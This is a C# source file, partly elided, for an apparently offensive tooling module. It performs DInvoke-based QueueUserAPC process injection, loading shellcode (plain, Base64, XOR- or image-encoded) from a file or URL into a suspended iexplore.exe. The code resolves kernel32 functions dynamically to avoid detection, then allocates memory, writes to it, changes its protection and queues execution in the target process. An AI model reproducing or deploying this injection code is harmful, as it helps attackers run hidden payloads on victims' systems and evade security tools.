// Adropted from the followings. DINVOKE using GetDelegateForFunctionPointer
// https://gist.githubusercontent.com/jfmaes/944991c40fb34625cf72fd33df1682c0/raw/68bbba6534499c4683ce868272398b3b9571be97/DInjectQueuerAPC.cs
// https://gist.githubusercontent.com/Flangvik/4c133a7790bf6f20fe2c6558143bc885/raw/21519d33b390d0259acc94dbc076482902a74ef6/CreateRemoteThreadDInvoke.cs
...
{
    public static class DIInjectorModule
    {
        public static Dictionary<string,string> GetInstructions()
        {
            Dictionary<string,string> menuextensions = new Dictionary<string,string>(){
                {"dinjectdemo", "DInvoke QueueUserAPC process injection for a calc shellcode. (dinjectdemo)"},
                {"dinjectraw", "DInvoke QueueUserAPC process injection for Base64 shellcode. (dinjectraw file/url URI/filepath)"},
                {"dinjectxor", "DInvoke QueueUserAPC process injection for XOR encoded shellcode. (dinjectxor file/url XORKey URI/filepath)"},
                {"dinjectimg", "DInvoke QueueUserAPC process injection for image encoded shellcode. (dinjectimg file/url XORKey URI/filepath)"},
            };
        ...
        public static void Operate(string[] instruction) {
            ...
            switch (instruction[0])
            {
                case "dinjectdemo":
                    ...
                    DIQueueUserAPCInjection(shellcode);
                    break;     
                case "dinjectraw":
                    loc = instruction[2];
                ...
                case "dinjectimg":
                    ...
                    break;                                                                              
                default:
                    Console.WriteLine("instruction couldn't be found in dinvoke injector module");
                    break;
            }
        }

        static void DIQueueUserAPCInjection(byte[] shellcode, string targetprocess=@"C:\Program Files\Internet Explorer\iexplore.exe")
        {
            ...
            IntPtr pointer = TSS.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            ...
            CreateProcess(targetprocess, null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            Console.WriteLine("Allocating the memory with RW.");
            pointer = TSS.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            ...
            pointer = TSS.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            ...
            Console.WriteLine("Opening the thread.");
            pointer = TSS.GetLibraryAddress("kernel32.dll", "OpenThread");
            ...
            pointer = TSS.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            ...
            pointer = TSS.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            ...
            pointer = TSS.GetLibraryAddress("kernel32.dll", "ResumeThread");
